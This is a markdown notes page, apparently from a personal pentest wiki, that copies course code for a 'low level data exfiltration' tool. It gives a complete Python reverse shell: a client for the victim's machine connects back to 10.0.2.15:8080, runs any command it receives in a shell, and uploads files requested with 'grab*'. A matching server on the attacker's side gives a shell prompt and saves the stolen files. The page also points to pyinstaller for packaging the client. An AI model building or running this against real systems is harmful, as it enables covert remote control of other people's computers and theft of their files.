---
title: Coding a low level data exfiltration - TCP connection
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
---

# Coding a low level data exfiltration  - TCP connection

From course: Python For Offensive PenTest: A Complete Practical Course

## Client

To be run on victim's computer.

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2
import socket
import subprocess
import os


# In the transfer function, we first check if the file exists in the first place, if not we will notify the attacker
# otherwise, we will create a loop where each time we iterate we will read 1 KB of the file and send it, since the
# server has no idea about the end of the file we add a tag called 'DONE' to address this issue, finally we close the file
def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())
def connecting():
    s = socket.socket()
    s.connect(("10.0.2.15", 8080))

    while True:
        command = s.recv(1024)

        if 'terminate' in command.decode():
            s.close()
            break


# if we received grab keyword from the attacker, then this is an indicator for file transfer operation, hence we will split the received commands into two parts, the second part which we intersted in contains the file path, so we will store it into a varaible called path and pass it to transfer function
         
# Remember the Formula is  grab*<File Path>
# Absolute path example:  grab*C:\Users\Hussam\Desktop\photo.jpeg
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())
def main():
    connecting()
main()

```

### Server 

To be run on attacker's computer.

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2
import os
import socket

def transfer(conn, command):
    conn.send(command.encode())
    grab, path = command.split("*")
    f = open('/home/kali/'+path, 'wb')
    while True:
        bits = conn.recv(2048)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4]) # Write those last received bits without the word 'DONE' 
            f.close()
            print ('[+] Transfer completed ')
            break
        if 'File not found'.encode() in bits:
            print ('[-] Unable to find out the file')
            break
        f.write(bits)
def connecting():
    s = socket.socket()
    s.bind(("10.0.2.15", 8080))
    s.listen(1)
    print('[+] Listening for income TCP connection on port 8080')
    conn, addr = s.accept()
    print('[+]We got a connection from', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            break
        elif 'grab' in command:
            transfer(conn, command)
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())
def main():
    connecting()
main()

```

## Using pyinstaller

See [pyinstaller](../pyinstaller.md).